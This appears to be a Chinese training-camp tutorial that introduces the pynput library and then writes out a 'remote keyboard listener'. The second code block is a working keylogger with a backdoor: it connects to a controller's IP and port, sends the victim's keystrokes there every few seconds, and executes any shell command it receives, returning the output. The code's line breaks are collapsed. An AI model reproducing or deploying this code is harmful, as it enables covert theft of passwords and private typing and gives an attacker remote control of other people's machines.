## **pynput**

**  

  

python的pynput库让可以控制和监控输入设备。

对于不同输入设备，pynput库使用两个子包来控制和监控输入设备：

*   pynput.mouse：包含控制和监控鼠标或者触摸板
    
*   pynput.keyboard：包含控制和监控键盘
    

  

那么今天训练营就带大家使用pynput库完成简单的远程键盘监听

```
def on_press(key):    pass
def on_release(key):    target = str(key).replace("'", "")    with open('key.txt', 'a') as f:        f.write(target + '\n')
```

```
import socketimport timeimport osimport subprocessfrom pynput.keyboard import Key, Listenerimport threading
HOST = ''  # 控制端IPPORT = 53132  # 控制端端口sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 建立socksock.connect((HOST, PORT))time.sleep(2)key_log = ''
def on_press(key):    pass
def on_release(key):    global key_log    target = str(key).replace("'", "")    key_log = key_log + target
def linsten():    with Listener(on_release=on_release, on_press=on_press) as Listeners:        Listeners.join()
def fa_key(sock):    global key_log    time.sleep(8)    sock.send(key_log.encode("UTF-8"))    key_log = ''
listen = threading.Thread(target=linsten)listen.start()listen2 = threading.Thread(target=fa_key,args=(sock,))listen2.start()while True:    try:        buf = sock.recv(1024)        cmd = buf.decode("utf-8")        answer = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,                                  stderr=subprocess.PIPE)        res = answer.stdout.read()        print(res)        res = str(res)        if res == "":            sock.send("OK".encode("UTF-8"))        sock.send(res.encode("UTF-8"))    except socket.timeout:        sock.close()
```
